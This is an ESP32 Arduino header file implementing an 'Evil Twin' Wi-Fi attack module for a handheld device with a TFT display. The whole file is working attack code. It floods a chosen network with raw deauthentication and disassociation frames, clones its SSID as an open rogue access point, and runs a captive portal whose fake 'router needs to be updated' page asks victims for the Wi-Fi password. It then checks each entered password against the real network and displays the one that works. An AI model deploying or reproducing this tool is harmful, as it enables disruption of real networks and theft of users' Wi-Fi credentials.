#ifndef JT2_H
#define JT2_H

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include "esp_wifi.h"

// --- Module UI Metadata ---
#define JT2_TITLE "Evil Twin"
#define JT2_COLOR 0xF800 // Red color theme for TFT UI

// External UI and Hardware references from main sketch
extern Adafruit_ST7735 tft;
extern void header(const char* title);
extern void footer(const char* text);
extern void printPad(int x, int y, const String &s, uint16_t fg, int chars);
extern int colsFrom(int x);
extern bool backPressed();
extern bool rotatePressed();
extern bool joyPressed();
extern void changeRotation();

struct JoyDir;
extern JoyDir readJoyDirection();

// --- Internal Structure Definitions ---
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} JT2_Network;

// Forward Declarations
void jt2DrawIcon(int x, int y, uint16_t color);
void jt2Feature();

// --- Internal Private Global Variables & Objects ---
namespace JT2_Internal {
  const byte DNS_PORT = 53;
  const IPAddress apIP(192, 168, 4, 1);
  
  DNSServer dnsServer;
  WebServer webServer(80);

  JT2_Network networks[16];
  JT2_Network selectedNetwork;

  String correctPass = "";
  String tryPassword = "";

  bool hotspot_active = false;
  bool deauthing_active = false;

  unsigned long now = 0;
  unsigned long wifinow = 0;
  unsigned long deauth_now = 0;

  int selectedIndex = 0;
  int scannedCount = 0;

  String bytesToStr(const uint8_t* b, uint32_t size) {
    String str;
    for (uint32_t i = 0; i < size; i++) {
      if (b[i] < 0x10) str += '0';
      str += String(b[i], HEX);
      if (i < size - 1) str += ':';
    }
    return str;
  }

  void clearArray() {
    for (int i = 0; i < 16; i++) {
      networks[i].ssid = "";
      networks[i].ch = 0;
      memset(networks[i].bssid, 0, 6);
    }
  }

  void performScan() {
    clearArray();
    int n = WiFi.scanNetworks();
    scannedCount = (n > 16) ? 16 : (n < 0 ? 0 : n);
    
    for (int i = 0; i < scannedCount; ++i) {
      networks[i].ssid = WiFi.SSID(i);
      networks[i].ch = WiFi.channel(i);
      for (int j = 0; j < 6; j++) {
        networks[i].bssid[j] = WiFi.BSSID(i)[j];
      }
    }
    
    if (scannedCount > 0 && selectedNetwork.ssid == "") {
      selectedNetwork = networks[0];
      selectedIndex = 0;
    }
  }

  void handleResult() {
    if (WiFi.status() != WL_CONNECTED) {
      webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    } else {
      webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP("Evil-Twin", "YellowPurple");
      dnsServer.start(DNS_PORT, "*", apIP);
      
      correctPass = "Success! Password: " + tryPassword;
    }
  }

  void handleIndex() {
    if (webServer.hasArg("ap")) {
      for (int i = 0; i < 16; i++) {
        if (bytesToStr(networks[i].bssid, 6) == webServer.arg("ap")) {
          selectedNetwork = networks[i];
        }
      }
    }

    if (webServer.hasArg("deauth")) {
      if (webServer.arg("deauth") == "start") deauthing_active = true;
      else if (webServer.arg("deauth") == "stop") deauthing_active = false;
    }

    if (webServer.hasArg("hotspot")) {
      if (webServer.arg("hotspot") == "start") {
        hotspot_active = true;
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP(selectedNetwork.ssid.c_str());
        dnsServer.start(DNS_PORT, "*", apIP);
      } else if (webServer.arg("hotspot") == "stop") {
        hotspot_active = false;
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP("Evil-Twin", "YellowPurple");
        dnsServer.start(DNS_PORT, "*", apIP);
      }
      return;
    }

    if (!hotspot_active) {
      String html = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'></head><body><h2>Evil Twin AP Target: " + selectedNetwork.ssid + "</h2></body></html>";
      webServer.send(200, "text/html", html);
    } else {
      if (webServer.hasArg("password")) {
        tryPassword = webServer.arg("password");
        WiFi.disconnect();
        WiFi.begin(selectedNetwork.ssid.c_str(), tryPassword.c_str(), selectedNetwork.ch, selectedNetwork.bssid);
        webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
      } else {
        webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + selectedNetwork.ssid + "' needs to be updated</h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
      }
    }
  }

  void handleAdmin() {
    handleIndex();
  }

  void sendDeauthFrames() {
    if (!deauthing_active || selectedNetwork.ssid == "") return;

    esp_wifi_set_channel(selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);

    uint8_t deauthPacket[26] = {
      0xC0, 0x00, 0x00, 0x00, 
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x00, 0x00, 0x01, 0x00
    };

    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);

    // Deauth Frame
    deauthPacket[0] = 0xC0;
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);

    // Disassociation Frame
    deauthPacket[0] = 0xA0;
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
  }
}

// --- Icon Renderer for Menu ---
void jt2DrawIcon(int x, int y, uint16_t color) {
  tft.drawTriangle(x + 7, y + 1, x + 1, y + 13, x + 13, y + 13, color);
  tft.drawCircle(x + 7, y + 8, 2, color);
}

// --- Main Executable Feature Function ---
void jt2Feature() {
  using namespace JT2_Internal;

  header("JT2 Evil Twin");
  printPad(4, 30, "Initializing AP...", ST77XX_YELLOW, 18);

  // Set Mode and enable promiscuous packet capability
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_promiscuous(true);

  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Evil-Twin", "YellowPurple");

  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  performScan();

  bool redraw = true;
  bool fullRedraw = true;

  while (true) {
    if (backPressed()) {
      // Clean up server and wifi state on exit
      webServer.stop();
      dnsServer.stop();
      esp_wifi_set_promiscuous(false);
      WiFi.softAPdisconnect(true);
      WiFi.mode(WIFI_STA);
      return;
    }

    if (rotatePressed()) {
      changeRotation();
      fullRedraw = true;
      redraw = true;
    }

    // Navigation Inputs
    JoyDir d = readJoyDirection();
    if (d.y != 0 && scannedCount > 0) {
      selectedIndex += d.y;
      if (selectedIndex < 0) selectedIndex = scannedCount - 1;
      if (selectedIndex >= scannedCount) selectedIndex = 0;
      selectedNetwork = networks[selectedIndex];
      redraw = true;
      delay(150);
    }

    // Toggle Actions via Joystick SW Click
    if (joyPressed()) {
      if (!deauthing_active && !hotspot_active) {
        deauthing_active = true;
      } else if (deauthing_active && !hotspot_active) {
        deauthing_active = false;
        hotspot_active = true;
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP(selectedNetwork.ssid.c_str());
        dnsServer.start(DNS_PORT, "*", apIP);
      } else {
        hotspot_active = false;
        deauthing_active = false;
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP("Evil-Twin", "YellowPurple");
        dnsServer.start(DNS_PORT, "*", apIP);
      }
      redraw = true;
      delay(200);
    }

    // Background Server Processing
    dnsServer.processNextRequest();
    webServer.handleClient();

    // Background Deauth Timer Loop
    if (deauthing_active && (millis() - deauth_now >= 1000)) {
      sendDeauthFrames();
      deauth_now = millis();
    }

    // Periodic Scanning Update
    if (millis() - now >= 15000) {
      if (!deauthing_active && !hotspot_active) {
        performScan();
        redraw = true;
      }
      now = millis();
    }

    if (fullRedraw) {
      header("JT2 Evil Twin");
      footer("SW:Toggle UD:Select");
      fullRedraw = false;
    }

    if (redraw) {
      int c = colsFrom(4);
      printPad(4, 25, "Target: " + (selectedNetwork.ssid.length() > 0 ? selectedNetwork.ssid : String("None")), ST77XX_WHITE, c);
      printPad(4, 40, "Ch: " + String(selectedNetwork.ch) + "  BSSID: " + bytesToStr(selectedNetwork.bssid, 6).substring(0, 8) + "..", ST77XX_BLUE, c);
      
      String deauthStatus = deauthing_active ? "ACTIVE" : "OFF";
      uint16_t deauthCol = deauthing_active ? ST77XX_RED : ST77XX_GREEN;
      printPad(4, 60, "Deauth: " + deauthStatus, deauthCol, c);

      String apStatus = hotspot_active ? "CLONED AP" : "OFF";
      uint16_t apCol = hotspot_active ? ST77XX_RED : ST77XX_GREEN;
      printPad(4, 75, "Rogue AP: " + apStatus, apCol, c);

      if (correctPass != "") {
        printPad(4, 95, correctPass, ST77XX_GREEN, c);
      } else if (tryPassword != "") {
        printPad(4, 95, "Tried: " + tryPassword, ST77XX_YELLOW, c);
      } else {
        printPad(4, 95, "Waiting for pass...", ST77XX_ORANGE, c);
      }

      redraw = false;
    }

    delay(10);
  }
}

#endif // JT2_H
        